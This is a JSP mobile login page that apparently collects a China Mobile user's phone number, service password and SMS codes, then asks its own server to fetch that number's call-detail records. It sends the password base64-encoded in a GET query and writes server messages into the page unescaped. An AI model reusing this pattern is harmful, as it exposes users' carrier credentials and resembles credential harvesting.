<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<%@page import="java.util.UUID"%>
<%@page import="java.util.Random"%>
<%
	String debug = UUID.randomUUID().toString();
	String ctx = request.getContextPath();
%>
<html>
<head>
<meta http-equiv="Content-Type" charset="UTF-8" />
<meta http-equiv="Cache-Control" content="no-cache" />
<meta name="viewport"
	content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0, minimal-ui" />
<title>登录页</title>
<script>
      var ctx='<%=ctx%>';
    </script>
<link href="<%=ctx%>/resources/staticTest/css/common.css?<%=debug%>"
	rel="stylesheet" type="text/css" />
<link href="<%=ctx%>/resources/staticTest/css/index.css?<%=debug%>"
	rel="stylesheet" type="text/css" />
<!-- <link href="<%=ctx%>/static/css/common.css?<%=debug%>" rel="stylesheet" type="text/css"/> -->
</head>
<body>
	<div class='errorBox'></div>

	<div class='login'>
		<% String phone=request.getParameter("phone");if(phone!=null){%>
		<input type="text" name="userName" id="userName" placeholder='请输入手机号码'
			oninput='this.value=this.value.replace(/\D/gi,"")' maxlength="11" disabled="disabled" value="${phone}">
			<%}else{ %>
				<input type="text" name="userName" id="userName" placeholder='请输入手机号码'
			oninput='this.value=this.value.replace(/\D/gi,"")' maxlength="11" >
			<%} %>
		<input type="password" name="passWord" id="passWord"
			placeholder='请输入服务密码'
			oninput='this.value=this.value.replace(/\D/gi,"")' maxlength="8">
		<div id="smsFirst" class='clickbox'>
			<input type="text" name="name" class='msgword' id="validateCode"
				placeholder='请输入验证码' value=''>
			<button class='clickBtn' id="getSmsFirst">点击获取</button>
		</div>
		<div id="loginBtn" class='nextBtn'>登录</div>
	<input type="hidden" id="cilentId" value="${clientId}">
	<input type="hidden" id="names" value="${name}">
	</div>
	<div class='imgtest' style='display: none'>
		<div class='clickbox'>
			<input type="text" id="smsSecond" class='msgword' name="smsSecond"
				placeholder='请输入二次验证码' value=''
				oninput='this.value=this.value.replace(/\D/gi,"")' maxlength="8">
			<button id="getSmsSecond" class='clickBtn'>点击获取</button>
		</div>
		<div class='imgbox'>
			<input type="text" name="name" placeholder='请输入图形验证码' id="picCode">
			<div class='imgkBtn'>
				<img id="authCode" />
			</div>
		</div>
		<div class='surebtn' id="secRz">认证</div>
		<br />
	</div>

</body>


<script type="text/javascript"
	src="<%=ctx%>/resources/staticTest/js/zepto.min.js?<%=debug%>"></script>
<script type="text/javascript"
	src="<%=ctx%>/resources/staticTest/js/chinaMobile.js?<%=debug%>"></script>
<script type="text/javascript"
	src="<%=ctx%>/resources/staticTest/js/jquery-1.11.3.min.js"></script>
	<script type="text/javascript"
	src="<%=ctx%>/resources/staticTest/js/phone.js"></script>
<!-- <script
	src="https://login.10086.cn/platform/js/??jquery.min.js,jquery.mailAutoComplete.l.js,jquery.cookie.js,login.js,reg.js,detectmobilebrowser.js,login_cub.js?resVer=20160515"
	type="text/javascript"></script> -->

<script>
$(function(){	
	$("#smsFirst").hide();	

	/* 短信发送倒计时 */
	$('.clickBtn').click(function(){
		$(this).attr('disabled','disabled');
		var _this=$(this);
		var time=60;	
		 _this.html('重新获取('+time+')');
		 _this.css('background','#fff').css('color','#999');
		var times=setInterval(function(){
			 time--;
			 if(time>=0){
				 _this.html('重新获取('+time+')');
				 _this.css('color','#999');
				}else{
					clearInterval(times);
					_this.html('点击获取');
					_this.removeAttr('disabled');
					_this.css('color','#DD005F');
				}
		},1000);
	});
	
	function refreshCode(){
		 //app.showProgress(); 
		 $.ajax({
			 url:"<%=ctx%>/mobile/getImage",
			 success:function(data){ 
				 //app.closeProgress();
				 if(data=='error'){
					 //app.showHintDialog(1,errMsg);
				 }else{
				 var json=JSON.parse(data);
					$("#authCode").attr("src","<%=ctx%>/"+json.respDesc);
				 }
			 }
		 });
	}
	
	/* 刷新验证码 */
	$("#authCode").click(function(){
		refreshCode();
	});
	
	/* 二次短信验证码 */
	$("#getSmsSecond").click(function(){
		//app.showProgress(); 
		$.ajax({
			url:"<%=ctx%>/mobile/smsSecond",
			type:"POST",
			success:function(data){ //app.closeProgress();
				if(data=='error'){
					 //app.showHintDialog(1,errMsg);
				}
				if(data.retCode!='000000'){
					$('.errorBox').show().html(data.retMsg);
				}
			}
		});
	});
	
	/* 二次认证 */
	$("#secRz").click(function(){
		var pwd=$("#passWord").val();
		var sms=$("#smsSecond").val();
		var val=$("#picCode").val();
		var userName=$("#userName").val();
		var names=$("#names").val();
		var cilentId=$("#cilentId").val();
		//app.showProgress();
		$.ajax({
			url:"<%=ctx%>/mobile/secRz",
			type:"GET",
			data:{
				pwd:base64encode(utf16to8(pwd)),
				rand:base64encode(utf16to8(sms)),
				val:val
			},
			success:function(data){ 
				//app.closeProgress();
				
				if(data.retCode=='000000'){
					//app.showHintDialog(0,"该手机号码的通话详单正在获取中，获取结果稍后会推送给您");
					$.ajax({
						url:"<%=ctx%>/mobile/getDetail",
						data:{
							phone:userName,
							names:names,
							cilentId:cilentId
						},
						success:function(data){							
						
							}
						});
					} else {
						refreshCode();
					}
				$('.errorBox').show().html(data.retMsg);
				}
			});
		});
		/* 	//前端校验
		 $('#userName').blur(function(){
		 if(!(/^1[34578]\d{9}$/.test(($(this).val())))){
		 $('.errorBox').show().html('请输入正确的手机号！');
		 }else{
		 $('.errorBox').hide();
		 }
		 });
		
		 $('#passWord').blur(function(){
		 if(!(/^\d{6,8}$/.test(($(this).val())))){
		 $('.errorBox').show().html('密码格式有误');      
		 }else{
		 $('.errorBox').hide();
		 }
		 });
		
		 $('.msgword').blur(function(){
		 if(!(/^\d{6}$/.test(($(this).val())))){
		 $('.errorBox').show().html('验证格式有误');
		 }else{
		 $('.errorBox').hide();
		 };
		 }); */

	});
</script>

</html>